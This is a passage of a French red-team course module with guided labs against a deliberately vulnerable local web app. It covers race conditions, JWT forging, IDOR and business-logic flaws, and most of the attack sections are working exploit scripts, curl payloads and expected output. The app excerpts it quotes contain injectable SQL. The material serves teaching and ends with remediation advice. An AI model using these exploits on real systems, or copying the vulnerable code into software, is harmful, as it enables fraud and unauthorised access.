**Scénario :** Un utilisateur ne peut transférer que 100€ par jour. L'attaquant envoie 10 transferts simultanés de 100€ → 1000€ transférés.

#### 4.3.4 2FA Bypass par Race Condition

**Scénario :** L'application vérifie le code 2FA et marque la session comme vérifiée. Si le marquage n'est pas atomique :

```
Time 0  : Requête 1 → vérification code (en cours)
Time +1ms: Requête 2 → vérification code (en cours) — session PAS ENCORE marquée
Time +2ms: Requête 1 → marquage session ✅
Time +3ms: Requête 2 → marquage session ✅ (contournement !)
```

### 4.4 Analyse du code vulnérable

```python
# Extrait de app.py — ligne 314-323
if coupon:
    coupon_info = query_db(f"SELECT * FROM coupons WHERE code='{coupon}'", one=True)
    if coupon_info and not coupon_info['used']:
        # Vérification OK
        # ⚠️ Délai volontaire pour exploiter la race condition
        time.sleep(1)
        # Marquer comme utilisé
        query_db(f"UPDATE coupons SET used=TRUE WHERE code='{coupon}'")
        discount = amount * coupon_info['discount_percent'] / 100
```

> **Analyse :** Le `time.sleep(1)` entre la vérification et la mise à jour est un délai délibérément ajouté. Pendant cette seconde, toutes les requêtes parallèles passent la vérification (`not coupon_info['used']` est vrai pour toutes).

### 4.5 TP Guidé — Race Condition sur `/api/transfer`

**Objectif :** Utiliser le coupon `VIP50` (50% de réduction, utilisable une fois) plusieurs fois via une race condition.

**Étape 1 — Vérifier l'état initial du coupon**

```bash
# Se connecter
curl -c /tmp/race_cookies.txt -X POST http://localhost:8080/login \
  -d "email=user@ecovault.com&password=User2026!" -L

# Tester une utilisation normale
curl -b /tmp/race_cookies.txt -X POST http://localhost:8080/api/transfer \
  -d "coupon=VIP50&amount=100"
```

Réponse attendue (première utilisation) :

```json
{
    "success": true,
    "original": 100.0,
    "discount": 50.0,
    "final": 50.0,
    "coupon": "VIP50"
}
```

**Étape 2 — Vérifier que le coupon est marqué comme utilisé**

```bash
# Deuxième tentative (devrait échouer)
curl -b /tmp/race_cookies.txt -X POST http://localhost:8080/api/transfer \
  -d "coupon=VIP50&amount=100"
```

```json
{"error": "Coupon déjà utilisé ou invalide"}
```

**Étape 3 — Réinitialiser le lab**

```bash
cd /home/yug/Documents/sdv-m2-red-team-2026/lab
./setup.sh reset
```

**Étape 4 — Exécuter l'attaque de race condition**

```python
#!/usr/bin/env python3
"""
race_exploit.py — Race condition sur VIP50
"""
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "http://localhost:8080"
s = requests.Session()
s.post(f"{BASE}/login", data={"email": "user@ecovault.com", "password": "User2026!"})

def use_coupon(n):
    r = s.post(f"{BASE}/api/transfer", data={"coupon": "VIP50", "amount": 100})
    try:
        d = r.json()
        if d.get("success"):
            return f"[{n}] ✅ SUCCÈS — final={d['final']}€ (économisé {d['discount']}€)"
        return f"[{n}] ❌ {d.get('error', 'inconnu')[:40]}"
    except:
        return f"[{n}] ⚠️ Erreur HTTP {r.status_code}"

# Lancer 30 requêtes en parallèle
with ThreadPoolExecutor(max_workers=30) as ex:
    fut = [ex.submit(use_coupon, i) for i in range(30)]
    for f in as_completed(fut):
        print(f.result())
```

```bash
python3 race_exploit.py
```

Sortie attendue :

```
[3] ❌ Coupon déjà utilisé ou invalide
[7] ❌ Coupon déjà utilisé ou invalide
[1] ✅ SUCCÈS — final=50.0€ (économisé 50.0€)
[2] ✅ SUCCÈS — final=50.0€ (économisé 50.0€)
[4] ✅ SUCCÈS — final=50.0€ (économisé 50.0€)
[9] ❌ Coupon déjà utilisé ou invalide
...
```

> **Explication :** Plusieurs requêtes passent la vérification `not coupon_info['used']` avant que le `UPDATE` ne soit exécuté. Résultat : le coupon est utilisé plusieurs fois.

**Étape 5 — Avec Turbo Intruder (Burp Suite)**

1. Intercepter la requête POST `/api/transfer` avec le coupon VIP50
2. `Ctrl+I` → Envoyer à Turbo Intruder
3. Coller ce script dans l'éditeur :

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=50,
                           pipeline=True)

    for i in range(50):
        engine.queue(target.req, None)

def handleResponse(req, interesting):
    table.add(req)
```

4. Cliquer sur « Attack »
5. Observer les réponses dans l'onglet Results — plusieurs `200 OK` avec `"success": true`

**Flag obtenu :** Pas de flag spécifique pour cet exercice, mais le principe de race condition est démontré.

---

## 5. Logique Métier — Workflow Abuse

**Tag MITRE ATT&CK :** T1068 — Exploitation for Privilege Escalation

### 5.1 Pattern 1 — Manipulation de Prix

**Principe :** L'application accepte le prix (ou le montant total) directement depuis le client, sans le recalculer côté serveur.

```http
POST /api/order HTTP/1.1
Content-Type: application/json

{
    "product_id": 5,
    "quantity": 1,
    "price": 0.01
}
```

Si le serveur utilise `price` pour calculer le total sans le vérifier par rapport à la base de données, l'attaquant peut acheter un produit à 1499€ pour 0.01€.

**Détection :**

```bash
# 1. Commande normale
curl -b /tmp/cookies.txt -X POST http://localhost:8080/api/order \
  -H "Content-Type: application/json" \
  -d '{"product_id": 5, "quantity": 1, "price": 1499.00}'

# 2. Commande avec prix manipulé
curl -b /tmp/cookies.txt -X POST http://localhost:8080/api/order \
  -H "Content-Type: application/json" \
  -d '{"product_id": 5, "quantity": 1, "price": 0.01}'
```

**Analyse du code vulnérable :**

```python
# Extrait de app.py — ligne 344-346
price = float(data.get('price', 0))
# ⚠️ BUSINESS LOGIC — Le prix est fourni par le client
```

### 5.2 Pattern 2 — Integer Overflow / Négatif

**Principe :** L'attaquant envoie des valeurs négatives ou très grandes pour provoquer un comportement non prévu.

**Cas du prix négatif :**

```http
POST /api/order HTTP/1.1
Content-Type: application/json

{
    "product_id": 5,
    "quantity": -1,
    "price": 1499.00
}
```

Si le total est calculé comme `quantity * price`, un `quantity` négatif donne un total négatif → l'application pourrait "rembourser" l'attaquant.

**Cas de l'overflow :**

```json
{
    "product_id": 5,
    "quantity": 1,
    "price": 0,
    "total": -999999
}
```

**Analyse du code vulnérable :**

```python
# Extrait de app.py — ligne 348-353
if price <= 0:
    # ⚠️ BUSINESS LOGIC — Integer overflow possible
    total = int(data.get('total', 0))
    if total < 0:
        return jsonify({
            'success': True,
            'message': 'flag{business_logic_overflow_2026}',
            'credit': abs(total)
        })
```

> **Explication :** Si `price <= 0` **et** que `total` est négatif, le flag est délivré. L'application crédite même la valeur absolue du total négatif.

### 5.3 Pattern 3 — Workflow Step Skipping

**Principe :** L'application impose un flux en plusieurs étapes (panier → adresse → paiement → confirmation), mais chaque étape est accessible via une URL distincte. L'attaquant saute les étapes de vérification.

**Exemple :**

```
Étapes normales :
  POST /cart/checkout         → 200 (total calculé)
  POST /checkout/address      → 200 (adresse validée)
  POST /checkout/payment      → 200 (paiement validé)
  POST /checkout/confirm      → 200 (commande créée)

Attaque (saut d'étapes) :
  POST /checkout/confirm      → 200 (commande créée sans passer par le paiement !)
```

**Détection :**

```bash
# Accéder directement à l'étape finale sans passer par les étapes intermédiaires
curl -X POST http://localhost:8080/checkout/confirm \
  -b /tmp/cookies.txt \
  -d '{"order_id": 42}' \
  -w "\nHTTP %{http_code}\n"
```

### 5.4 Pattern 4 — Parameter Pollution

**Principe :** L'attaquant envoie le même paramètre plusieurs fois. Le comportement du serveur dépend de la manière dont il traite les paramètres dupliqués.

**HTTP Parameter Pollution (HPP) :**

```http
POST /api/transfer HTTP/1.1
Content-Type: application/x-www-form-urlencoded

amount=100&amount=999999&coupon=VIP50
```

**Comportements possibles selon la pile technique :**

| Technologie | Dernier paramètre | Premier paramètre | Tous (liste) |
|-------------|-------------------|-------------------|--------------|
| PHP/Apache  | ✅ (`999999`) | ❌ | ❌ |
| Python/Flask | ❌ | ✅ (`100`) | ❌ |
| ASP.NET/IIS | ✅ | ❌ | ❌ |
| Node.js/Express | ❌ | ✅ | ❌ |
| Java/Tomcat | ❌ | ✅ | ❌ |

**CSV Injection (exemple connexe) :**

```http
POST /api/export HTTP/1.1
Content-Type: application/json

{
    "collection": "users",
    "filter": {"role": {"$ne": "nonexistent"}}
}
```

### 5.5 TP Guidé — Manipuler `/api/order` pour le flag overflow

**Objectif :** Exploiter l'integer overflow dans le endpoint `/api/order` pour obtenir le flag.

**Étape 1 — Analyser le endpoint**

```bash
# Tester une commande normale
curl -b /tmp/cookies.txt -X POST http://localhost:8080/api/order \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 2, "price": 99.99}'
```

```json
{
    "success": true,
    "product_id": 1,
    "quantity": 2,
    "price": 99.99,
    "total": 199.98,
    "message": "Commande enregistrée"
}
```

**Étape 2 — Tester la condition `price <= 0`**

```bash
curl -b /tmp/cookies.txt -X POST http://localhost:8080/api/order \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 1, "price": 0}'
```

**Étape 3 — Envoyer un total négatif avec price = 0**

```bash
curl -b /tmp/cookies.txt -X POST http://localhost:8080/api/order \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 1, "price": 0, "total": -999999}'
```

Réponse :

```json
{
    "success": true,
    "message": "flag{business_logic_overflow_2026}",
    "credit": 999999
}
```

**Flag obtenu :** `flag{business_logic_overflow_2026}`

**Étape 4 — Comprendre le mécanisme**

```python
# Logique vulnérable :
if price <= 0:                      # Condition 1 : prix <= 0
    total = int(data.get('total', 0))  # Récupère le total depuis le client
    if total < 0:                   # Condition 2 : total négatif
        return jsonify({
            'success': True,
            'message': 'flag{...}',
            'credit': abs(total)    # Donne le crédit (positif)
        })
```

> **Explication :** L'attaquant envoie un `price` à 0 (déclenche la condition) et un `total` négatif (déclenche la seconde condition). Le flag est retourné, et l'application crédite même `abs(total)` sur le compte.

**Étape 5 — Automatisation**

```python
#!/usr/bin/env python3
"""
overflow_exploit.py — Obtention du flag via integer overflow
"""
import requests

BASE = "http://localhost:8080"
s = requests.Session()
s.post(f"{BASE}/login", data={"email": "user@ecovault.com", "password": "User2026!"})

r = s.post(f"{BASE}/api/order", json={
    "product_id": 1,
    "quantity": 1,
    "price": 0,
    "total": -999999
})

print(r.json())
```

```bash
python3 overflow_exploit.py
```

---

## 6. TP Synthèse

### 6.1 Parcours d'attaque complet

**Objectif :** Enchaîner les vulnérabilités du Module 3 pour passer d'un utilisateur standard à l'obtention du flag overflow.

**Déroulement :**

```
user@ecovault.com
    │
    ├── 1. IDOR (T1548)
    │   └── GET /api/profile/1 → flag{admin_api_key_4a7b9c}
    │
    ├── 2. JWT Forge (T1078 / T1134)
    │   ├── Option A: None algorithm
    │   ├── Option B: HMAC/RSA confusion
    │   └── Option C: Kid injection (/dev/null)
    │   └── Résultat: Token admin → accès /admin/debug
    │
    ├── 3. Business Logic Overflow (T1068)
    │   └── POST /api/order → flag{business_logic_overflow_2026}
    │
    └── Objectif atteint : 2 flags récupérés
```

**Script de synthèse :**

```python
#!/usr/bin/env python3
"""
tp_synthese.py — Parcours complet du Module 3
Enchaîne IDOR → JWT Forge → Business Logic Overflow
"""
import jwt
import requests

BASE = "http://localhost:8080"
s = requests.Session()

print("=" * 60)
print("Étape 1 — Connexion")
print("=" * 60)
s.post(f"{BASE}/login", data={"email": "user@ecovault.com", "password": "User2026!"})
print("[+] Connecté en tant que user@ecovault.com\n")

print("=" * 60)
print("Étape 2 — IDOR : Récupération du profil admin")
print("=" * 60)
r = s.get(f"{BASE}/api/profile/1")
admin_data = r.json()
print(f"    Email  : {admin_data.get('email')}")
print(f"    Rôle   : {admin_data.get('role')}")
print(f"    API Key: {admin_data.get('api_key')}")
print()

print("=" * 60)
print("Étape 3 — JWT Forge (HMAC/RSA Confusion)")
print("=" * 60)
pub = s.get(f"{BASE}/api/jwt-info").json()["public_key"]
admin_payload = {"user_id": 1, "email": "admin@ecovault.com", "role": "admin"}
forged_token = jwt.encode(admin_payload, pub, algorithm="HS256")
print(f"    Token forgé: {forged_token[:50]}...")
# Tester le token
r = s.get(f"{BASE}/admin/debug", cookies={"token": forged_token})
if r.ok:
    print(f"    [+] Accès admin confirmé")
    print(f"    [+] Debug info: {r.json()}")
else:
    print(f"    [-] Échec, tentative avec kid injection...")
    forged_token = jwt.encode(admin_payload, "", algorithm="HS256",
                              headers={"kid": "/dev/null"})
    r = s.get(f"{BASE}/admin/debug", cookies={"token": forged_token})
    print(f"    [+] Token forgé (kid): {forged_token[:50]}...")
    print(f"    [+] Debug info: {r.json()}")
print()

print("=" * 60)
print("Étape 4 — Business Logic Overflow")
print("=" * 60)
r = s.post(f"{BASE}/api/order", json={
    "product_id": 1, "quantity": 1, "price": 0, "total": -999999
})
result = r.json()
print(f"    Message: {result.get('message')}")
print(f"    Credit : {result.get('credit')}€")
print()

print("=" * 60)
print("RÉSULTATS")
print("=" * 60)
print(f"  Flag 1 (IDOR)    : {admin_data.get('api_key')}")
print(f"  Flag 2 (Overflow) : {result.get('message')}")
```

```bash
python3 tp_synthese.py
```

### 6.2 Tableau de synthèse des techniques ATT&CK

| Étape | Technique | ID ATT&CK | Point d'entrée | Impact |
|-------|-----------|-----------|----------------|--------|
| 1 | Insecure Direct Object Reference | T1548.002 | `GET /api/profile/{id}` | Accès non autorisé aux profils utilisateurs |
| 2a | Token Manipulation — JWT None Alg | T1134.003 | En-tête JWT `alg: none` | Contournement complet de l'authentification |
| 2b | Token Manipulation — HMAC/RSA Confusion | T1134.003 | Clé publique exposée sur `/api/jwt-info` | Forge de token admin |
| 2c | Token Manipulation — Kid Injection | T1134.003 | Paramètre `kid` dans l'en-tête JWT | Signature avec clé arbitraire |
| 3 | Race Condition — TOCTOU | T1068 | `POST /api/transfer` avec `time.sleep(1)` | Utilisation multiple d'un coupon |
| 4 | Business Logic — Integer Overflow | T1068 | `POST /api/order` avec `total` négatif | Crédit frauduleux et obtention du flag |
| 5 | Valid Accounts — Default Credentials | T1078.001 | Compte `user@ecovault.com` divulgué | Accès initial au système |

### 6.3 Heat map ATT&CK (Module 3)

```
Techniques exploitées dans ce module :

T1548 ─ Abuse Elevation Control Mechanism
├── T1548.002 ─ IDOR ──── ████████████ 100%

T1134 ─ Access Token Manipulation
├── T1134.003 ─ JWT None ── ████████████ 100%
├── T1134.003 ─ JWT Confusion ████████████ 100%
└── T1134.003 ─ Kid Inject ─ ████████████ 100%

T1078 ─ Valid Accounts
├── T1078.001 ─ Credentials ████████░░░ 80%

T1068 ─ Exploitation for Privilege Escalation
├── Race Condition ─────── ████████████ 100%
└── Business Logic ─────── ████████████ 100%
```

### 6.4 Recommendations de remédiation

| Vulnérabilité | Correctif | Priorité NIS2 |
|---------------|-----------|---------------|
| IDOR | Vérifier l'appartenance de chaque ressource : `if user_id != current_user.id: return 403` | Critique |
| JWT None Alg | Refuser `alg: none` dans la bibliothèque JWT | Critique |
| JWT Confusion | Utiliser des clés différentes pour HMAC et RSA, vérifier l'algo attendu | Élevée |
| Kid Injection | Valider le `kid` contre une liste blanche, ne pas faire de path traversal | Élevée |
| Race Condition | Rendre les opérations atomiques (transactions SQL, verrous applicatifs) | Élevée |
| Price Manipulation | Recalculer le prix côté serveur à partir de la base de données | Moyenne |
| Integer Overflow | Valider les types et les bornes : `if quantity <= 0: raise` | Moyenne |

### 6.5 Pour aller plus loin

**Ressources :**

| Ressource | URL |
|-----------|-----|
| MITRE ATT&CK — T1548 | https://attack.mitre.org/techniques/T1548/ |
| MITRE ATT&CK — T1134 | https://attack.mitre.org/techniques/T1134/ |
| MITRE ATT&CK — T1068 | https://attack.mitre.org/techniques/T1068/ |
| PortSwigger — IDOR | https://portswigger.net/web-security/access-control/idor |
| PortSwigger — JWT | https://portswigger.net/web-security/jwt |
| PortSwigger — Race Conditions | https://portswigger.net/web-security/race-conditions |
| OWASP — Business Logic | https://owasp.org/www-community/vulnerabilities/Business_Logic_Vulnerability |
| jwt_tool | https://github.com/ticarpi/jwt_tool |
| JWT.io | https://jwt.io |
| Turbol Intruder (Burp) | https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988 |

---

*Fin du Module 3 — Authentification & Logique Métier*
